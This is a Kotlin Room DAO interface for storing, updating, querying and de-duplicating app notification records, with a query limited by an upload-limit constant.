package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.AppNotifications
import com.android.services.util.AppConstants
import java.util.*

@Dao
interface AppNotificationsDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(appNotifications: AppNotifications)

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(appNotifications: List<AppNotifications>)

    @Query("Update app_notifications set status = :updated_status where date BETWEEN :startDate AND :endDate")
    fun updateAppNotifications(updated_status: Int, startDate: Date, endDate: Date)

    @Query("Select * from app_notifications where status = :status order by date DESC limit ${AppConstants.otherLogsUploadLimit}")
    fun selectAllAppNotifications(status: Int): List<AppNotifications>

    @Query("Select unique_id from app_notifications where unique_id=:id")
    fun checkIfAlreadyExist(id: String): String?
}